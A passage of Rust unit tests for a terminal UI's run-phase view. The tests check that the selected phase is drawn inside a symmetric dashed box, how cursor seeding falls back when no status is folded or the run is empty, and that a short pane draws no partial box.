    settle(&mut tui, &views);
    assert_eq!(tui.cursor[0], chosen);
}

#[test]
fn the_selected_phase_sits_in_a_symmetric_dashed_box() {
    // The console draws a dashed ring around the selected phase; the
    // terminal draws a dashed BOX that hugs the segment's occupied
    // rows — a symmetric boundary, not two floating uprights running
    // the pane's full height through empty headroom.
    let views = views();
    let mut tui = at_run();
    settle(&mut tui, &views);
    apply(&mut tui, &views, Key::Char('j'));
    let frame = frame_of(&tui, &views, 100, 26);
    for corner in ['╭', '╮', '╰', '╯'] {
        assert!(
            frame.matches(corner).count() == 1,
            "exactly one {corner}: {frame}"
        );
    }
    assert!(frame.contains('╌'), "dashed edges: {frame}");
    assert!(frame.contains('┆'), "dashed sides: {frame}");
    // Symmetric: the corners pair up on their columns and rows.
    let lines: Vec<&str> = frame.lines().collect();
    let find = |glyph: char| -> (usize, usize) {
        lines
            .iter()
            .enumerate()
            .find_map(|(row, line)| {
                line.chars()
                    .position(|c| c == glyph)
                    .map(|column| (row, column))
            })
            .unwrap()
    };
    let (top_l, left) = find('╭');
    let (top_r, right) = find('╮');
    let (bottom_l, left2) = find('╰');
    let (bottom_r, right2) = find('╯');
    assert_eq!(top_l, top_r, "one top edge");
    assert_eq!(bottom_l, bottom_r, "one bottom edge");
    assert_eq!(left, left2, "one left side");
    assert_eq!(right, right2, "one right side");
    assert!(bottom_l > top_l && right > left, "a real rectangle");
    // The box hugs the graph: its top edge is NOT the pane's first
    // content row when there is headroom above the rail.
    assert!(top_l > 1, "the box does not run the pane's full height");

    // Nothing selected, nothing boxed.
    let mut bare = at_run();
    bare.cursor[0] = None;
    let frame = frame_of(&bare, &views, 100, 26);
    assert!(!frame.contains('╭'), "no selection, no box: {frame}");
    assert!(!frame.contains('┆'), "no selection, no sides: {frame}");
}

#[test]
fn seeding_falls_back_to_the_last_phase_and_an_empty_run_seeds_nothing() {
    // Without a folded status no phase is current, and the last phase
    // entered is still where an operator is looking. A journal with no
    // phases at all seeds nothing, which is what None already says.
    let mut unfolded = views();
    unfolded.run = Some(forge_view::run_view(&journal("intake"), None));
    let mut tui = Tui::new(Some("run-7".to_string()));
    settle(&mut tui, &unfolded);
    let last = unfolded
        .run
        .as_ref()
        .unwrap()
        .phases
        .last()
        .map(|phase| phase.name.clone());
    assert_eq!(tui.cursor[0], last, "falls back to the last phase entered");

    let mut empty = views();
    empty.run = Some(forge_view::run_view(&[], None));
    let empty = empty;
    let mut tui = Tui::new(Some("run-7".to_string()));
    settle(&mut tui, &empty);
    assert!(tui.cursor[0].is_none(), "no phases, no cursor");

    // And an empty rail clears the scope rather than stranding one.
    let mut tui = at_run();
    tui.scope = Some(render::Scope::Phase("design".to_string()));
    apply(&mut tui, &empty, Key::Char('j'));
    assert!(tui.scope.is_none(), "nothing to select, nothing scoped");
}

#[test]
fn a_pane_too_short_for_the_box_row_draws_no_half_box() {
    // Height 3 has no reserved box row; half a box would be two
    // floating lines, which is exactly what the box replaced.
    let views = views();
    let mut tui = at_run();
    settle(&mut tui, &views);
    let phases = &views.run.as_ref().unwrap().phases;
    let short = plan(
        phases,
        None,
        "running",
        tui.cursor[0].as_deref(),
        None,
        80,
        3,
    );
    assert_eq!(short.box_row, None);
    let frame = text_of(&paint(&short, 0, false));
    assert!(!frame.contains('╭'), "no box row, no box: {frame}");
    assert!(!frame.contains('┆'), "and no floating sides: {frame}");
}
